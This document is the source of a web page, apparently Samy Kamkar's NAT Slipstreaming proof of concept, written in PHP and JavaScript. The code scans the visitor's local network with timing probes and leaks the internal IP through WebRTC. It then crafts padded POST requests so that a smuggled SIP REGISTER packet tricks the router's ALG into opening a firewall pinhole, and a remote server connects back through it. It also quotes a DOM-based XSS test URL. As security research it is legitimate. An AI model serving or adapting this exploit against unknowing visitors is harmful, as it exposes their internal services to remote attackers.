<html>
<head><title>Samy Kamkar - NAT Slipstreaming</title></head>

<body>
<script>
</script>
<script src="https://webrtc.github.io/adapter/adapter-latest.js"></script>

<div id=acidburn style="visibility: hidden; position: absolute;"></div>


<a href="https://samy.pl">https://samy.pl</a> || <a href="https://twitter.com/samykamkar">@samykamkar</a> || <a href="mailto:code@samy.pl">email me</a><hr>

<!--
<iframe scrolling=no frameborder=0 border=0 src="//samy.pl/list/" width=600px height=160></iframe><br>
-->

<a href="https://samy.pl/slipstream/">NAT Slipstreaming</a> allows an attacker to remotely access any TCP/UDP services bound to a victim machine, bypassing the victim's NAT/firewall (arbitrary firewall pinhole control), just by the victim visiting a website. <a href="https://samy.pl/slipstream/">Full writeup here.</a><p>

<a href="https://github.com/samyk/slipstream/">github.com/samyk/slipstream</a>: NAT Slipstreaming PoC code</a><p>

<p>
please run:<br>
<?php 
$port = @$_GET['port'] ? $_GET['port'] : 3306;
$port = preg_replace("/[^0-9]/", "", $port); // to fix the xss issue
?>
<code>echo something here | (nc -vl <?php echo $port; ?> || nc -vvlp <?php echo $port; ?>)</code><p>
then hit the button below<br>
<form name=woot>Port: <input id=port type=text name=port value=<?php echo $port; ?>>
&nbsp; <input type=button id=button value="please wait" disabled onClick="natpin()"><p>
</form>
<hr>
<br>
<pre id=log>
</pre>

<iframe name="A" style="display:none"></iframe>

<?php

function q2d($ip)
{
	$ips = explode (".", $ip);
	return ($ips[3] + $ips[2] * 256 + $ips[1] * 256 * 256 + $ips[0] * 256 * 256 * 256); 
}
$ip = q2d(getenv('REMOTE_ADDR'));
?>


<script>

const NOPE = 'nerp'
const PAD = '^_'
const END_PAD = '\r\n'
const EXTRA_PAD = '='
var beginScan = false
var hasWebRTC = navigator.getUserMedia ||
        navigator.webkitGetUserMedia ||
        navigator.mozGetUserMedia ||
        navigator.msGetUserMedia ||
        window.RTCPeerConnection
var ua = navigator.userAgent.toLowerCase()
var isFF = ua.indexOf('firefox') > -1
var isSafari = false
var isChrome = false
var isIE = (function() {
	var rv = 0
	if (navigator.appName == 'Microsoft Internet Explorer')
	{
		var re  = new RegExp("MSIE ([0-9]{1,}[\\.0-9]{0,})")
		if (re.exec(ua) !== null)
			rv = parseFloat(RegExp.$1)
	}
	else if (navigator.appName == 'Netscape')
		rv = ua.indexOf('trident/') > -1 ? 11 : ua.indexOf('edge/') > -1 ? 12 : 0
	return rv
})()
console.log("ie", isIE)
if (ua.indexOf('safari') != -1)
	ua.indexOf('chrome') > -1 ? isChrome = true : isSafari = true

const scanInBlocks = 16
var globalInc = 0
var scanForLocalip = isSafari || (isIE && isIE <= 11)
var args = getArgs()
var noRespTimer
var stunTimer
var formnum = 0
var tries = 1
var maxTries = args['maxTries'] || 40
var rand
var lastOff = 0
var fullpkt
var internal
var internals = []
var external = "<?php echo getenv('REMOTE_ADDR') ?>"
var maxbytes = 0
var offerOptions = {offerToReceiveAudio: 1}
var ip_dups = {}
var pc
var port
var stun = "stun:samy.pl:3478"
	//"iceServers": [ { "urls": [stun], "username": "samy", "credential": "samy" } ],
var config = {
	//"iceServers": [ { "urls": [stun] } ],
	"iceServers": [ ],
	"iceTransportPolicy":"all",
	"iceCandidatePoolSize":"0"
}

var MAX_MS = 3500;
function getMs() { return (new Date()).getTime() }
var nets = [
	'10.0.0.1',
	'10.0.0.138',
	'10.0.0.2',
	'10.0.1.1',
	'10.1.1.1',
	'10.1.10.1',
	'10.10.1.1',
	'10.90.90.90',
	'192.168.*.1',
	'192.168.0.10',
	'192.168.0.100',
	'192.168.0.101',
	'192.168.0.227',
	'192.168.0.254',
	'192.168.0.3',
	'192.168.0.30',
	'192.168.0.50',
	'192.168.1.10',
	'192.168.1.100',
	'192.168.1.20',
	'192.168.1.200',
	'192.168.1.210',
	'192.168.1.254',
	'192.168.1.99',
	'192.168.10.10',
	'192.168.10.100',
	'192.168.10.50',
	'192.168.100.100',
	'192.168.123.254',
	'192.168.168.168',
	'192.168.2.254',
	'192.168.223.100',
	'192.168.254.254',
	//'200.200.200.5',
]
var lowest = 4294967296
var lowest_ip
var tmr = []
var ipi = 0
var possibleIps = []
var sortIps = {}
var scanned = {}
var classC = {}
var scanClasses = []
var candidStr = ' (most likely candidate)'

// scan common gateways to detect local network
function scanLocalNets()
{
	log('<b>performing timing attack to detect subnet, then internal ip</b>')
	for (var net in nets)
	{
		if (nets[net].indexOf('*') != -1)
		{
			var orig = nets[net]
			for (var i = 0; i < 256; i++)
			{
				var ip = orig.replace('*', i)

				// don't scan ip if we already know its subnet is live
				if (!classC[getSubnet(ip)])
					timeIp(ip, true)
			}
		}
		else
		{
			// don't scan ip if we already know its subnet is live
			if (!classC[getSubnet(nets[net])])
				timeIp(nets[net], true)
		}
	}
}

function timeIp(ip, gateway)
{
	// don't rescan same ip
	if (scanned[ip])
		return
	scanned[ip] = true

	//console.log("timing " + ip)
	var starttime, endtime
	var div = document.createElement('div')
	div.id = 't' + ipi
	div.style.display = 'none'
	document.getElementById('log').appendChild(div)
	var img = new Image()
	img.id = 'img' + ipi
	div.innerHTML = getMs()

	/* get end time - ; is required on next line */
	;(function(i, ip, img, gateway) {
		img.onerror = img.onload = function()
		{
			//clearTimeout(tmr[i])
			div = document.getElementById('t' + i)
			var diff = getMs() - div.innerHTML

			// don't show ones we've stopped
			if (diff > MAX_MS)
				return
			div.style.display = 'block'

			var ipclass = getSubnet(ip)
			if (!classC[ipclass])
			{
				classC[ipclass] = {start: 0}
				scanClasses.push(ipclass)
				//scanClass(ipclass)
			}

			sortIps[ip] = gateway || ip.match(/\.(?:0|1|255)$/) ? diff + 50 : diff
			possibleIps.push(ip)
			possibleIps = possibleIps.sort(function(a, b) { return sortIps[a] - sortIps[b] })
console.log("sorted", possibleIps)

			div.innerHTML = !gateway || classC[ipclass].printed ? 'discovered ' + htmlEncodeSpecial(ip) + ' in ' + diff + 'ms, possible internal ip' : '<b>discovered local subnet: ' + htmlEncodeSpecial(ip) + ' responded with either RST or SYN</b>'
			classC[ipclass].printed = true

			// ignore .0 and .255
			if (!ip.match(/\.(?:0|255)$/) && !gateway && i != 1 && diff < lowest)
			{
				lowest = diff
				if (lowest_ip)
				{
					var old = document.getElementById('t' + lowest_ip)
					old.style.fontWeight = 'normal'
					old.innerHTML = old.innerHTML.substr(0, old.innerHTML.indexOf(candidStr))
				}
				div.style.fontWeight = 'bold'
				div.innerHTML += candidStr
				lowest_ip = i
			}

		}
	})(ipi, ip, img, gateway)

	/* time how long "image" takes to load/error */
	img.src = 'http://' + ip + '/samy.jpg'
	;(function(img, i) {
		// remove the element
		setTimeout(function()
		{
			var img = document.getElementById('img' + i)
			if (img)
			{
				img.src = 'about:none'
				img.style.display = 'none'
				img.style.visibility = 'hidden'
				img.parentNode.removeChild(img)
			}
		}, MAX_MS)
		//tmr[i] = setTimeout(function() { img.src = '#' }, MAX_MS)
	})(img, ipi)

	ipi++
}

// return subnet from ip address
function getSubnet(ip)
{
	return ip.substr(0, ip.indexOf('.', ip.indexOf('.', ip.indexOf('.')+1)+1)+1)
}

// runs every 200ms
function scanClass()
{
	if (!scanClasses[0])
		return

	// scan 16 at a time
	var iprange = scanClasses[0]
	var ipo = classC[iprange]
	ipo.start += scanInBlocks

	// scanned all ips
	if (ipo.start >= 255)
		scanClasses.shift()

	// move any computation above
	for (var i = ipo.start - scanInBlocks; i < ipo.start; i++)
		timeIp(iprange + i, false)
}


// check whether we have everything we need to connect
var checkButton = function()
{
	if ((possibleIps.length || internal || external) && maxbytes)
	{
		if (document.getElementById('button').disabled)
			log('\nready to traverse NAT/network/firewall, <b>press button above</b>...')
		document.getElementById('button').disabled = false
		document.getElementById('button').value = 'open this port!'
		//var str = window.location.search
		//if (str.indexOf('&go=1') > -1 || str.indexOf('?go=1') > -1)
		if (args['go'])
			natpin()
	}
	else
	{
		setTimeout(checkButton, 200)
	}
}

function log(msg)
{
	document.getElementById('log').innerHTML = htmlEncodeSpecial(msg) + '<br>' + document.getElementById('log').innerHTML
}

// called by get_size script tag upon load
function set_bytes(bytes)
{
	var txt = JSON.stringify(bytes).replace(/,/g, ', ').replace(/"/g, '')
	nlog(txt)
	log("beacon received, packet capture lengths: " + txt)
	log('stuff padding to fill tcp packet: <b>' + bytes.stuff_bytes +' bytes</b>')
	//log('spare bytes')
	maxbytes = bytes.stuff_bytes
}

function maxpktsize()
{
	rand = rnd().replace('.', '')
	var pkt = 'BEGIN_SAMY_MAXPKTSIZE=' + rand

	// we've seen MTU of 5792, how much bigger are there?
	for (var j = 0; j < 6000/PAD.length; j++)
		pkt += PAD
	pkt += 'END_SAMY_MAXPKTSIZE'

	getSize()

	// note 'packet_size' length is critical, must be same as other post
	log('responding to SYN with maximum segment size TCP option to control data size')
	post("http://samy.pl:5060/samy_pktsiz", pkt, 1)
	log('sending TCP beacon to detect maximum packet size and MTU')
}

function getSize()
{
	var scr = document.createElement('script')
	scr.type = 'text/javascript'
	scr.src = '//samy.pl/natpin/get_size?id=' + rand + '&rand=' + rnd()
	log('requesting sniffed packet sizes from server')
	document.head.appendChild(scr)
}

function natpin()
{
	document.getElementById('port').disabled = true
	document.getElementById('button').disabled = true 
	document.getElementById('button').value = 'please refresh to retry/change port'

	runpin()
}

function addScript(url)
{
	var scr = document.createElement('script')
	scr.type = 'text/javascript'
	scr.src = url
	document.head.appendChild(scr)
}

// ascii to hex
function a2h(str)
{
	var hex = []
	for (var n = 0; n < str.length; n++) 
	{
		var hbyte = Number(str.charCodeAt(n)).toString(16)
		if (hbyte.length == 1)
			hbyte = "0" + hbyte
		hex.push(hbyte)
	}
	return hex.join('')
}


// call from /monitor
function offset(off, data, origoff)
{
	clearTimeout(noRespTimer)

	data = data.replace(/</g, '&lt;').replace(/>/g, '&gt;')
	//data = data.replace(internal, '<b>'+internal+'</b>').replace(internal, '<b>'+internal+'</b>').replace(':' + port, ':<b>'+port+'</b>')
	data = data.replace('Contact:', 'Contact:<b>').replace('To:', '</b>To:')
	data = data.replace(/\r/g, '').replace(/\n\n{2,}/, '\n')
	data = data.replace(/^/mg, '   ')

	log('offset=' + off + ' (orig ' + origoff + '), received this packet:\n<i>' + data + '</i>')

	// if there's an offste, packet got misaligned due to browser most likely
	if (off)
	{
		if (tries++ >= maxTries)
		{
			log("BAILING - tried more than maximum tries of " + maxTries)
			nlog(document.getElementById('log').innerHTML)
		}
		else
		{
			if (off == lastOff)
			{
				log("offset same as last time, maybe something in HTTP header changed - adjusting packet length")
				log("old len " + fullpkt.length)

				// Firefox switches up boundary by a few bytes
				if (off < 0)
					fullpkt = pad(-1 * off) + fullpkt
					//for (var i = 0; i < -1 * off; i++) fullpkt	= ' ' + fullpkt
				// happens on Edge?
				else if (off > 100)
				{
					//tries = maxTries
					getSize()
					log('got too much offset, get size again')
					fullpkt = pad(off) + fullpkt
					//for (var i = 0; i < off; i++) fullpkt	= ' ' + fullpkt
				}
				else
					fullpkt = fullpkt.substr(off)

				log("new len " + fullpkt.length)
				lastOff = 0
			}
			else
				lastOff = off

			log("packet size changed on us, reattempt SIP REGISTER")
			addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())
			attemptPin(fullpkt)
		}
	}
	else
	{
		// find @ sign in Contact
		var c = data.substr(data.indexOf('Contact:'))
		var bind = c.indexOf('@')+1
		var eind = c.indexOf(';')
		var ip = c.substr(bind, bind+eind)
		ip = ip.substr(0, ip.indexOf(':'))
		if (ip != internal)
		{
			log("<br><b>status: SUCCESS! ip in returned SIP packet is " + ip + "</b>, different than what we sent (<b>"+internal+"</b>), victim NAT rewrote it<br><hr>")
			if (scanForLocalip)
				log("<b>confirmed internal IP is " + ip + "</b>")
		}
		else
		{
			if (scanForLocalip)
				log("<br><b>status:</b> ip in returned SIP packet is <b>" + ip + "</b> is no different than what we sent, probably used incorrect IP or NAT doesn't have ALG enabled for TCP SIP<br>")
			else
				log("<br><b>status:</b> ip in returned SIP packet is <b>" + ip + "</b> is no different than what we sent, NAT likely does not have ALG enabled for TCP SIP<br>")
		}
		
		if (ip != internal || !scanForLocalip)
			tryConnect()
		else
			runpin()
	}
}

function tryConnect()
{
	log('running: nc -v <?php echo getenv('REMOTE_ADDR') ?> ' + port)
	log('\n<b>attempting to bypass your NAT/firewall</b>')
	addScript('//samy.pl/natpin/connect.php?id=' + rand + '&port=' + port)
}

// called from /connect.pl (along with some log()s)
function connectDone()
{
	nlog(document.getElementById('log').innerHTML)
}

// add padding
function pad(maxpad)
{
	var padding = ''

/*
	if (maxpad % 2 == 1)
	{
		maxpad--
		padding += '\r'
	}
	for (var j = 0; j < maxpad/2; j++)
		padding += '\r\n'
*/
	if (maxpad >= PAD.length)
	{
		for (var j = 0; j < parseInt((maxpad-END_PAD.length)/PAD.length); j++)
			padding += PAD
		for (var j = 0; j < maxpad % PAD.length; j++)
			padding += EXTRA_PAD
		padding += END_PAD
	}
	else
		for (var j = 0; j < maxpad; j++)
			padding += EXTRA_PAD

console.log(maxpad, padding.length)
	return padding
}

// we didn't get a response from sip packet in timely fashion
function noResponse()
{
	log('packet not detected on other side')
	if (scanForLocalip)
	{
		log('packet likely not detected due to incorrect internal ip')
		runpin()
	}
}

function runpin()
{
	if (scanForLocalip)
	{
		if (!possibleIps.length)
		{
			log('no more internal ips to try! bailing')
			tryConnect()
			return
		}
		internal = possibleIps.shift()	
		log('trying potential internal ip <b>' + internal + '</b>')
	}
	port = document.getElementById('port').value
	tries = 1

	ip = <?php echo $ip ?>;
	var cid = rand.padStart(30, 'a') + 'b'

	var reg = 'REGISTER sip:samy.pl;transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP {INTIP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:samy@{INTIP}:' + port + ';rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:samy@samy.pl;transport=TCP>\r\nFrom: <sip:samy@samy.pl;transport=TCP>;tag=U7c3d519\r\nCall-ID: ' + cid + 'bbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: samy natpinning v2\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n'
	//reg += 'v=0\r\no=151 9655 9655 IN IP4 {INTIP}\r\ns=-\r\nc=IN IP4 {INTIP}\r\nt=0 0\r\nm=audio '+port+' RTP/AVP 8 0 2 18\r\na=rtpmap:8 PCMA/8000\r\na=rtpmap:0 PCMU/8000\r\na=rtpmap:2 G726-32/8000/1\r\na=rtpmap:18 G729/8000\r\na=ptime:20\r\na=maxptime:80\r\na=sendrecv\r\na=rtcp:50025\r\n\r\n'

	// create the padding to force our packet to fall onto next packet boundary
	var s = pad(maxbytes)

	if (!internal)
	{
		log("odd, no internal ip found, trying external: " + external)
		internal = external
	}
	reg = reg.replace(/\{INTIP\}/g, internal)
	s += reg
	console.log('reg', reg)

	reg = reg.replace(/</g, '&lt;').replace(/>/g, '&gt;')
	reg = reg.replace(internal, '<b>'+internal+'</b>').replace(internal, '<b>'+internal+'</b>').replace(':' + port, ':<b>'+port+'</b>')
	reg = reg.replace('Contact:', 'Contact:<b>').replace('To:', '</b>To:')
	reg = reg.replace(/^/mg, '   ').replace(/\r/g, '')
	log('maximizing POST data over port 5060 to force "SIP packet" to begin on packet boundary')
	log('injecting overflowed 2nd packet contents:\n<i>' + reg + '</i>')
	fullpkt = s

	// get our sip request from the server, calls offset() if good, otherwise noRespTimer will likely hit
	addScript('//samy.pl/natpin/monitor?id=' + rand + '&port=' + port + '&rnd=' + rnd())

	// if we don't get request in a few seconds, something wrong...maybe wrong internal ip if safari
	noRespTimer = setTimeout(noResponse, 5000)

	attemptPin(s)
	// firefox sometimes uses different width multipart boundaries
}

// perform actual "POST" to send the SIP message
function attemptPin(pkt)
{
	var incr = globalInc.toString().padStart(4, '0')
	incr++

	// keep changing url to evade browser caching attempts
	// THE LENGTH OF THE URL MUST BE 12 bytes total, eg /samy_n?0012
	// to match the same size we got when testing /samy_pktsiz
	post("http://samy.pl:5060/samy_n?"+incr, pkt, 1)
}

function post(url, str, reuse)
{
console.log(url, str.length)
	acidburn = document.getElementById("acidburn")
//	gibson = document.createElement("form")
	if (reuse && document.getElementById('pinform'))
	{
		gibson = document.getElementById('pinform')
	}
	else
		gibson = document.createElement("form")
	if (reuse) gibson.setAttribute("name", "B" + parseInt(Math.random()*10).toString())
	if (reuse) gibson.setAttribute("id", "pinform")
	else gibson.setAttribute("id", "rndform" + rnd())

	var ifr = document.createElement('iframe')
	ifr.name = 'A' + rnd()
	ifr.style.display = 'none'
	acidburn.appendChild(ifr)

	gibson.setAttribute("target", ifr.name) // A
	gibson.setAttribute("method", "post")
	gibson.setAttribute("action", url)
	gibson.setAttribute("enctype", "multipart/form-data")
	if (reuse && document.getElementById('pintextarea'))
		crashoverride = document.getElementById('pintextarea')
	else
		crashoverride = document.createElement("textarea")
	crashoverride.setAttribute("name", "C" + parseInt(Math.random()*10).toString())
	if (reuse) crashoverride.id = 'pintextarea'
	crashoverride.setAttribute("value", str)
	crashoverride.innerText=str
	crashoverride.innerHTML=htmlEncodeSpecial(str)
	gibson.appendChild(crashoverride)
	acidburn.appendChild(gibson)

	//setTimeout('l('+port+')', 500)

	// this may never complete
  if (window.location.protocol === 'http:')
    gibson.submit()
}

function l(port)
{
	alert("Great! Almost done. Now, from a remote network, try running the command:\n\ntelnet <?php echo getenv('REMOTE_ADDR') ?> " + port + "\n\nNote: This proof of concept may not work on all routers. Tested successfully on Belkin N1 Vision Wireless Router.")
}

//config={"iceServers":[{"urls":["stun:samy.pl:3478"],"username":"hello","credential":"bye"}],"iceTransportPolicy":"all","iceCandidatePoolSize":"0"}

function gotDescription(desc)
{
	console.log("desc", desc)
	candidates = []
	pc.setLocalDescription(desc)
}

function startStun()
{
	log('creating webrtc data channel to obtain local ip<br>')
  changeURL()

  // make sure we're attempting webrtc only on https
  if (window.location.protocol === 'http:' && !args['localip'])
  {
    log('redirecting to https to acquire local ip via WebRTC')
    window.location.protocol = 'https:'
    return
  }

  // we're on https or attempted to get ip already
  if (!hasWebRTC)
  {
    log('failed to create webrtc object, possibly old browser, falling back to tcp timing attack')

    scanForIP() // scan using old ip
    return
  }
	pc = new RTCPeerConnection(config)

	stunTimer = setTimeout(function()
	{
    if (window.location.protocol === 'https:')
      setTimeout(function() { gohttp() }, 1000)
		if (internal) // odd, this should have been cleared by candidate	
		{
			log("weird, somehow got internal ip " + internal + ", continuing")
			checkButton()
		}
		else
		{
			log("webrtc took too long, falling back to scanning for IP")
			scanForIP()
		}
	}, 5000)

	if (pc.createDataChannel) pc.createDataChannel('', { reliable: false }) // XXX is this required? maybe for some browsers
	pc.onicecandidate = icecan // function(can) { console.log("can", can) }
	pc.onicegatheringstatechange = gather
	pc.createOffer(offerOptions).then(gotDescription, function(e) { console.log("b", e) })
}

// redirect to http with our internal ip (if we have one)
function gohttp()
{
  return go('http')
}
function gohttps()
{
  return go('https')
}
function go(type)
{
  var other = type === 'http' ? 'https' : 'http'
  if (window.location.protocol === other + ':')
  {
    var search = window.location.search ? window.location.search + '&' : '?'
    var intip = internals.length ? internals.join(',') : NOPE
    search += 'localip=' + intip
    log('redirecting to http including local ip address: ' + intip)
    window.location = type + '://' + window.location.host + window.location.pathname + search + window.location.hash
  }
}

function nlog(str)
{
	post('//samy.pl/natpin/nlog', str)
}
function gather(sc)
{
	console.log('stun gathering', sc)
	if (pc.iceGatheringState !== 'complete')
		return
	pc.close()
}
function icecan(sc)
{
	clearTimeout(stunTimer)
	console.log("sc", sc, JSON.stringify(sc))

	console.log("canjs", sc.candidate, JSON.stringify(sc.candidate))

	var can = sc.candidate ? sc.candidate.candidate : (sc.currentTarget && sc.currentTarget.localDescription ? sc.currentTarget.localDescription.sdp : '')
	if (can)
	{
		var lines = can.split('\n')
		lines.forEach(function(line)
		{
			if (line.indexOf('a=candidate:') === 0 || line.indexOf('candidate:') === 0)
				handleCandidate(line)
		})
	}

  if (window.location.protocol === 'https:')
    setTimeout(function() { gohttp() }, 1000)
	if (!internal)
	{
		console.log("odd, webrtc got candidate but don't see local ip, maybe ipv6? trying internal scan")
		scanForIP()
	}
	else
		checkButton()
/*
	if (sc && sc.currentTarget && sc.currentTarget.localDescription)
		nlog(sc.currentTarget.localDescription.sdp)
	var lines = sc.currentTarget.localDescription.sdp.split('\n')
	lines.forEach(function(line)
	{
		if (line.indexOf('a=candidate:') === 0)
			handleCandidate(line)
	})
*/
}

function handleCandidate(candidate)
{
	// match just the IP address
	var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
	var ips = ip_regex.exec(candidate)
	if (!ips)
	{
		log('unusable candidate detected: <b>' + candidate + '</b>')
		return
	}
	var ip = ips[1]
	console.log('can', candidate, JSON.stringify(candidate))
	
	// remove duplicates
	if (ip_dups[ip] === undefined)
	{
		candidate = candidate.replace('\r', '').replace('\n', '')
		//log('ip found: <i>' + candidate+'</i>')
		log('internal ip detected: <b>' + ip + '</b>')
		if (ip.match(/\./))
    {
			internal = ip
      internals.push(ip)
    }

		// only do this if using a stun server as we'll get multiple responses
		/*
		// internal
		if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/))
		{
			internal = ip
			log('internal ip detected: <b>' + ip + '</b>')
			console.log("internal", ip)
		}

                // ipv6
                else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/))
		{
			log('ipv6 detected: <b>' + ip + '</b>')
			console.log("ipv6", ip)
		}

                // public
                else
		{
			external = ip
			log('public ip detected: <b>' + ip + '</b>')
			console.log("public", ip)
		}
		*/
	}
	ip_dups[ip] = true
}



/*
 // this might affect cookies, changing packet size

var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-6127617-2']);
_gaq.push(['_trackPageview']);
(function() {
var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})()
*/



function noDescription(error) {
  console.log('Error creating offer: ', error);
}


function rnd()
{
	return Math.random().toString()
}

function scanForIP(forced)
{
  gohttp()
  changeURL()
	// don't double-scan
	if (beginScan) return
	beginScan = true

	if (!forced)
		log("your browser (Safari, IE11, others) doesn't provide internal IP via WebRTC, initiating local scan")

	// scan local networks via timing attack
	scanLocalNets()

	// give some time for local net scan to finish, then scan classes
	var delayScan = 1000
	var scanBlocksMs = 200
	setTimeout(function() {
		setInterval(scanClass, scanBlocksMs)
	}, delayScan)
	
	setTimeout(checkButton, delayScan + scanBlocksMs * (256 / scanInBlocks))
	//internal = prompt("Sorry, this won't work in Safari without knowing your *internal* ip - please enter it here")
	//internal = internal.replace(' ', '')
}

function changeURL()
{
  var nargs = getArgs()
  if (args['localip'] && nargs['localip'])
    if (window.history.replaceState)
      window.history.replaceState({}, null, window.location.protocol + '//' + window.location.host + window.location.pathname)
}

function start()
{
  // we'll attempt to get local ip via webrtc - but this only works on some browsers on https, while some o our attacks require http, so we must jump back and forth

  // if we tried to get localip and on https, go to http
  if (args['localip'] && args['localip'].length)
  {
    if (window.location.protocol === 'https:')
      window.location.protocol = 'http:'
  }
  // no localip yet?
  else
  {
    // only redirect to https if we're on http
    if (window.location.protocol === 'http:')
      window.location.protocol = 'https:'
    // we'll direct back to http later
  }

	maxpktsize()

	// try getting local ip a few ways
	if (!internal)
	{
		if (args['ip'])
			internal = args['ip']
    else if (args['localip'] && args['localip'] !== NOPE)
    {
      log('created webrtc data channel to obtain local ip over https')
      log('webrtc acquired ips: <b>' + args['localip'] + '</b>')
      log('redirected to http to continue attack with localips in url')
      var ips = args['localip'].split(',')
      internal = ips[ips.length-1]
      log('using first ip: <b>' + internal + '</b>')
      changeURL()
    }
		else if (lcip())
			internal = lcip()
		else if (hasWebRTC)
			startStun() // will run checkButton
		else
			scanForIP() // will run checkButton
	}
	//if (!isChrome) scanForIP(true) // force scan

	if (internal)
		checkButton()
}

function getArgs(url)
{
	var params = {}
	if (!url)
		url = window.location.search.substr(1)
	else
		url = url.substr(url.indexOf('?'))

	var vars = url.split('&')
	for (var i = 0; i < vars.length; i++)
	{
		var pair = vars[i].split('=')
		params[pair[0]] = decodeURIComponent(pair[1])
	}
	return params
}

// return local ip if liveconnect enabled (old school)
function lcip()
{
	var ip
	try {
		if (typeof(java) != "undefined" && typeof(java.net) != "undefined")
		{
			var sock = new java.net.Socket()
			sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0))
			sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port)?80:document.location.port))
			ip = sock.getLocalAddress().getHostAddress()
		}
	} catch(e) { }
	return ip
}

// polyfill helpers
if (!String.prototype.repeat) {
  String.prototype.repeat = function(count) {
    'use strict';
    if (this == null) {
      throw new TypeError('can\'t convert ' + this + ' to object');
    }
    var str = '' + this;
    count = +count;
    if (count != count) {
      count = 0;
    }
    if (count < 0) {
      throw new RangeError('repeat count must be non-negative');
    }
    if (count == Infinity) {
      throw new RangeError('repeat count must be less than infinity');
    }
    count = Math.floor(count);
    if (str.length == 0 || count == 0) {
      return '';
    }
    // Ensuring count is a 31-bit integer allows us to heavily optimize the
    // main part. But anyway, most current (August 2014) browsers can't handle
    // strings 1 << 28 chars or longer, so:
    if (str.length * count >= 1 << 28) {
      throw new RangeError('repeat count must not overflow maximum string size');
    }
    var maxCount = str.length * count;
    count = Math.floor(Math.log(count) / Math.log(2));
    while (count) {
       str += str;
       count--;
    }
    str += str.substring(0, maxCount - str.length);
    return str;
  }
}

// https://github.com/uxitten/polyfill/blob/master/string.polyfill.js
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/padStart
if (!String.prototype.padStart) {
    String.prototype.padStart = function padStart(targetLength,padString) {
        targetLength = targetLength>>0; //truncate if number or convert non-number to 0;
        padString = String((typeof padString !== 'undefined' ? padString : ' '));
        if (this.length > targetLength) {
            return String(this);
        }
        else {
            targetLength = targetLength-this.length;
            if (targetLength > padString.length) {
                padString += padString.repeat(targetLength/padString.length); //append to original to ensure we are longer than needed
            }
            return padString.slice(0,targetLength) + String(this);
        }
    };
}

// to fix DOM-based XSS issues - https://samy.pl/slipstream/server.php?localip=1.1.1.1<img src onerror%3dalert(1)>
function htmlEncodeSpecial(value) {
    return value.replace(/</gi,'&lt;').replace(/>/gi,'&gt;').replace(/&lt;([a-zA-Z])&gt;/gi,'\<$1\>').replace(/&lt;\/([a-zA-Z])&gt;/gi,'</$1>');
}

start()
</script>
</body>
</html>
